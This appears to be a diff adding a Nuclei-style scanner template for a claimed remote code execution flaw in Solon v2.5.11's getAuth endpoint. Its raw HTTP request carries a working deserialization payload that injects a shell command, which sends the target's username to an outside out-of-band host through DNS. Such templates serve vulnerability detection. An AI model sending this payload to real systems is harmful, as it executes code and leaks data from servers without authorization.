@@ -1,0 +1,20 @@
+id: solon-v2511-getauth-rce
+info:
+  name: Solon v2.5.11 getAuth 接口远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Solon v2.5.11 及更早版本中的 getAuth 接口存在远程代码执行漏洞（RCE）。该漏洞需在 Linux 环境下配置 JDK 才能触发，且攻击者可通过向任意参数化路由发送恶意请求利用此漏洞。
+  tags: Solon
+http:
+- raw:
+  - "POST /adminPage/login/getAuth HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n\"name\": {\n    \"@type\": \"sun.print.UnixPrintServiceLookup\", \n    \"lpcFirstCom\": [\n        \";ping -nc 2 `whoami`.{{interactsh-url}};\",\n        \";ping -nc 2 `whoami`.{{interactsh-url}};\"\n        ]\n    }\n}\n"
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
